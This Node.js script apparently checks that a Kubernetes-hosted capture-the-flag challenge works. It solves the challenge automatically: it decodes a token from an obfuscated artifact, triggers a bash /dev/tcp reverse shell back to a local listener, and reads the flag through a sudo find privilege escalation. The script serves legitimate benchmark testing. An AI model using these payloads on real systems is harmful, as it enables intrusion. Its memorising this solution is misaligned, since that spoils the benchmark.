#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const net = require('net');
const { spawnSync } = require('child_process');
const {
  ROOT_DIR,
  ensureDeployed,
  nodeHostIp,
  runSync,
  startTraefikPortForward,
  stopChild,
  challengeRequestUrl,
  benchmarkRequestUrl
} = require('./k8s-lib');
const { selectedBySlug, flagValue } = require('./benchmark-config');

const reverse = selectedBySlug.reverse;
const BASE_DOMAIN = process.env.LUXORA_BASE_DOMAIN || '127.0.0.1.sslip.io';
const stamp = new Date().toISOString().replace(/[:.]/g, '-');
const artifactDir = path.join(ROOT_DIR, 'artifacts', 'check', `reverse-silver-k8s-${stamp}`);
const commandLogPath = path.join(artifactDir, 'commands.log');

fs.mkdirSync(artifactDir, { recursive: true });

let commandIndex = 0;
const summary = {
  artifactDir,
  baseDomain: BASE_DOMAIN,
  debugHookUnlocked: false,
  directFlagReadDenied: false,
  privescFlagRead: false,
  realReverseShellConnected: false
};

function writeFile(name, data) {
  const filePath = path.join(artifactDir, name);
  fs.writeFileSync(filePath, data);
  return filePath;
}

function appendCommandLog(text) {
  fs.appendFileSync(commandLogPath, text);
}

function shellQuote(value) {
  if (/^[A-Za-z0-9_./:=@%+-]+$/.test(value)) return value;
  return `'${value.replaceAll("'", "'\\''")}'`;
}

function run(label, command, args, options = {}) {
  commandIndex += 1;
  const id = String(commandIndex).padStart(2, '0');
  const commandLine = [command, ...args].map(shellQuote).join(' ');
  appendCommandLog(`\n[${id}] $ ${commandLine}\n`);

  const result = spawnSync(command, args, {
    cwd: ROOT_DIR,
    env: options.env || process.env,
    encoding: 'utf8',
    timeout: options.timeoutMs || 180_000
  });

  const stdoutPath = writeFile(`${id}-${label}.stdout.txt`, result.stdout || '');
  const stderrPath = writeFile(`${id}-${label}.stderr.txt`, result.stderr || '');
  const status = result.status === null ? 'signal' : result.status;
  appendCommandLog(`[${id}] exit=${status} stdout=${path.relative(ROOT_DIR, stdoutPath)} stderr=${path.relative(ROOT_DIR, stderrPath)}\n`);

  if (result.error && !options.allowFailure) {
    throw result.error;
  }
  if (result.status !== 0 && !options.allowFailure) {
    throw new Error(`${label} failed with exit ${result.status}; see ${stdoutPath} and ${stderrPath}`);
  }
  return result.stdout || '';
}

function assertIncludes(text, needle, label) {
  if (!text.includes(needle)) {
    throw new Error(`${label} did not include ${needle}`);
  }
}

function assertIncludesOneOf(text, needles, label) {
  if (needles.some((needle) => text.includes(needle))) {
    return;
  }
  throw new Error(`${label} did not include any of: ${needles.join(', ')}`);
}

function ror8(value, bits) {
  return ((value >> bits) | (value << (8 - bits))) & 0xff;
}

function reverseSilverKey(index) {
  return ((index * 29) ^ 0xa7 ^ ((index + 3) * 11)) & 0xff;
}

function solveArtifact(source) {
  const payloadMatch = source.match(/const __payload = "([0-9a-f]+)"/i);
  const orderMatch = source.match(/const __order = \[([0-9,\s]+)\]/);
  if (!payloadMatch || !orderMatch) {
    throw new Error('artifact did not expose the expected encoded payload and order table');
  }

  const encoded = payloadMatch[1].match(/../g).map((byte) => Number.parseInt(byte, 16));
  const order = orderMatch[1].split(',').map((value) => Number.parseInt(value.trim(), 10));
  const recovered = new Array(order.length);
  encoded.forEach((byte, position) => {
    const sourceIndex = order[position];
    recovered[sourceIndex] = ror8(byte, (sourceIndex % 5) + 1) ^ reverseSilverKey(sourceIndex);
  });
  return Buffer.from(recovered).toString('utf8');
}

function curlWithStatus(label, args, options = {}) {
  const stdout = run(label, 'curl', ['-s', '--retry', '30', '--retry-delay', '1', '--retry-all-errors', '--retry-connrefused', '-w', '\n__HTTP_STATUS__:%{http_code}', ...args], {
    ...options,
    allowFailure: true
  });
  const marker = '\n__HTTP_STATUS__:';
  const idx = stdout.lastIndexOf(marker);
  if (idx === -1) {
    throw new Error(`${label}: missing status marker in curl output`);
  }
  return {
    body: stdout.slice(0, idx),
    status: Number.parseInt(stdout.slice(idx + marker.length).trim(), 10)
  };
}

function curlHost(label, request, options = {}) {
  return curlWithStatus(label, ['-H', `Host: ${request.host}`, request.url], options);
}

function debugHook(label, request, { token, cmd, timeoutMs } = {}) {
  const args = ['-X', 'POST', request.url, '-H', `Host: ${request.host}`, '-H', 'Content-Type: application/json'];
  if (token !== undefined) {
    args.push('-H', `X-Debug-Token: ${token}`);
  }
  args.push('-d', JSON.stringify(cmd === undefined ? {} : { cmd }));
  return curlWithStatus(label, args, { timeoutMs: timeoutMs || 30_000 });
}

function assertUnlockResponse(text) {
  const parsed = JSON.parse(text);
  if (parsed.success !== true || parsed.unlocked !== 'debug-hook') {
    throw new Error(`unexpected unlock response: ${text}`);
  }
  if ('flag' in parsed) {
    throw new Error('unlock response must not return the flag over HTTP');
  }
  return parsed;
}

function expectedFlag() {
  return flagValue(reverse.layer, reverse.slug, reverse.difficulty, reverse.points, reverse.technique);
}

function popRealReverseShell(debugRequest, token, callbackHost) {
  return new Promise((resolve, reject) => {
    const marker = `RSHELL_OK_${Date.now()}`;
    let settled = false;
    const server = net.createServer();

    const finish = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      server.close();
      if (err) reject(err);
      else resolve(value);
    };

    const timer = setTimeout(() => finish(new Error('reverse shell did not call back within timeout')), 30_000);

    server.on('error', (err) => finish(err));
    server.on('connection', (socket) => {
      let buffer = '';
      let matched = false;
      socket.on('error', () => {});
      socket.on('data', (chunk) => {
        if (matched) return;
        buffer += chunk.toString('utf8');
        if (buffer.includes(marker)) {
          matched = true;
          socket.end('exit\n');
          finish(null, buffer);
        }
      });
      socket.write(`echo ${marker}\n`);
    });

    server.listen(0, '0.0.0.0', () => {
      const { port } = server.address();
      const payload = `setsid bash -c 'exec bash -i >& /dev/tcp/${callbackHost}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown; echo triggered`;
      let trigger;
      try {
        trigger = debugHook('debug-trigger-reverse-shell', debugRequest, { token, cmd: payload, timeoutMs: 15_000 });
      } catch (err) {
        finish(err);
        return;
      }
      if (trigger.status !== 200) {
        finish(new Error(`reverse shell trigger failed: status=${trigger.status} body=${trigger.body}`));
      }
    });
  });
}

async function main() {
  appendCommandLog(`reverse-silver k8s check started ${new Date().toISOString()}\n`);
  appendCommandLog(`logs: ${artifactDir}\n`);

  run('verify-k8s-manifests', 'node', ['scripts/verify-k8s-manifests.js']);
  ensureDeployed(BASE_DOMAIN);
  const portForward = await startTraefikPortForward(artifactDir);
  const callbackHost = nodeHostIp();
  summary.callbackHost = callbackHost;
  summary.ingressPort = portForward.localPort;

  try {
    const directRoot = challengeRequestUrl('reverse', '/', portForward.localPort);
    const directArtifact = challengeRequestUrl('reverse', '/artifact.js', portForward.localPort);
    const directHints = challengeRequestUrl('reverse', '/hints', portForward.localPort);
    const directDebug = challengeRequestUrl('reverse', '/debug', portForward.localPort);
    const benchmarkRoute = benchmarkRequestUrl('/reverse/silver', portForward.localPort);
    const benchmarkArtifact = benchmarkRequestUrl('/reverse/silver/artifact.js', portForward.localPort);

    const page = curlHost('challenge-page', directRoot);
    writeFile('reverse-page.html', page.body);
    if (page.status !== 200) {
      throw new Error(`reverse page returned ${page.status}`);
    }
    assertIncludesOneOf(page.body, ['/artifact.js', '/reverse/silver/artifact.js'], 'reverse challenge page');
    assertIncludesOneOf(page.body, ['/hints', '/reverse/silver/hints'], 'reverse challenge page');

    const hints = curlHost('challenge-hints', directHints);
    writeFile('hints.json', hints.body);
    const parsedHints = JSON.parse(hints.body);
    if (!Array.isArray(parsedHints.hints) || parsedHints.hints.length < 5) {
      throw new Error('hints endpoint did not provide enough solving guidance');
    }

    const artifact = curlHost('challenge-artifact', directArtifact);
    writeFile('artifact.js', artifact.body);
    const token = solveArtifact(artifact.body);

    const bad = curlHost('bad-token', {
      host: directRoot.host,
      url: `${directRoot.url}?payload=hardcoded_in_binary`
    });
    writeFile('bad-token.html', bad.body);
    assertIncludes(bad.body, 'Token rejected', 'bad token response');

    const solved = curlHost('solve-token', {
      host: directRoot.host,
      url: `${directRoot.url}?payload=${encodeURIComponent(token)}`
    });
    writeFile('solved.json', solved.body);
    assertUnlockResponse(solved.body);
    summary.recoveredToken = token;
    summary.debugHookUnlocked = true;

    const debugNoToken = debugHook('debug-no-token', directDebug, { cmd: 'id' });
    writeFile('debug-no-token.json', debugNoToken.body);
    if (debugNoToken.status !== 403) {
      throw new Error(`debug hook without token expected 403, got ${debugNoToken.status}`);
    }

    const debugWrongToken = debugHook('debug-wrong-token', directDebug, { token: 'not-the-real-token', cmd: 'id' });
    writeFile('debug-wrong-token.json', debugWrongToken.body);
    if (debugWrongToken.status !== 403) {
      throw new Error(`debug hook with wrong token expected 403, got ${debugWrongToken.status}`);
    }

    const debugNoCmd = debugHook('debug-no-cmd', directDebug, { token });
    writeFile('debug-no-cmd.json', debugNoCmd.body);
    if (debugNoCmd.status !== 400) {
      throw new Error(`debug hook without cmd expected 400, got ${debugNoCmd.status}`);
    }

    const debugWhoami = debugHook('debug-whoami', directDebug, { token, cmd: 'whoami' });
    writeFile('debug-whoami.json', debugWhoami.body);
    const whoamiJson = JSON.parse(debugWhoami.body);
    assertIncludes(whoamiJson.stdout || '', 'ctfuser', 'debug hook whoami stdout');

    const flagPath = '/tmp/rndsecurity-isolated/reverse-silver/flag.txt';
    const directRead = debugHook('debug-direct-flag-read', directDebug, { token, cmd: `cat ${flagPath}` });
    writeFile('debug-direct-flag-read.json', directRead.body);
    const directReadJson = JSON.parse(directRead.body);
    if (directReadJson.exitCode === 0) {
      throw new Error('ctfuser could read the locked flag directly');
    }
    assertIncludes(`${directReadJson.stderr || directReadJson.stdout}`, 'Permission denied', 'direct flag read stderr');
    summary.directFlagReadDenied = true;

    const reverseShellBuffer = await popRealReverseShell(directDebug, token, callbackHost);
    writeFile('reverse-shell-callback.txt', reverseShellBuffer);
    assertIncludes(reverseShellBuffer, 'RSHELL_OK_', 'reverse shell callback');
    summary.realReverseShellConnected = true;

    const privesc = debugHook('debug-privesc-read', directDebug, {
      token,
      cmd: `sudo find ${flagPath} -maxdepth 0 -exec cat {} \\;`
    });
    writeFile('debug-privesc-read.json', privesc.body);
    const privescJson = JSON.parse(privesc.body);
    const expected = expectedFlag();
    assertIncludes(privescJson.stdout || '', expected, 'privesc flag stdout');
    summary.privescFlagRead = true;

    const consolePage = curlHost('console-page', challengeRequestUrl('reverse', '/__console', portForward.localPort));
    writeFile('console-page.html', consolePage.body);
    if (consolePage.status !== 200) {
      throw new Error(`console page returned ${consolePage.status}`);
    }

    const consoleState = curlHost('console-state', challengeRequestUrl('reverse', '/__console/state', portForward.localPort));
    writeFile('console-state.json', consoleState.body);
    assertIncludesOneOf(consoleState.body, ['/artifact.js', '/reverse/silver/artifact.js'], 'console state');

    const proxyPage = curlHost('benchmark-proxy-page', benchmarkRoute);
    writeFile('benchmark-proxy-page.html', proxyPage.body);
    assertIncludes(proxyPage.body, '/reverse/silver/artifact.js', 'benchmark proxy page');

    const proxyArtifact = curlHost('benchmark-proxy-artifact', benchmarkArtifact);
    writeFile('benchmark-proxy-artifact.js', proxyArtifact.body);
    if (proxyArtifact.body !== artifact.body) {
      throw new Error('benchmark host artifact differed from direct challenge host artifact');
    }

    runSync('kubectl', ['logs', 'deployment/reverse-silver', '-n', 'luxora'], { allowFailure: true });

    writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
    console.log('PASS reverse-silver k3s check');
    console.log(`Recovered token: ${token}`);
    console.log(`Flag: ${expected}`);
    console.log(`Callback host: ${callbackHost}`);
    console.log(`Artifacts: ${artifactDir}`);
  } finally {
    stopChild(portForward.child);
  }
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : String(error));
  process.exitCode = 1;
});
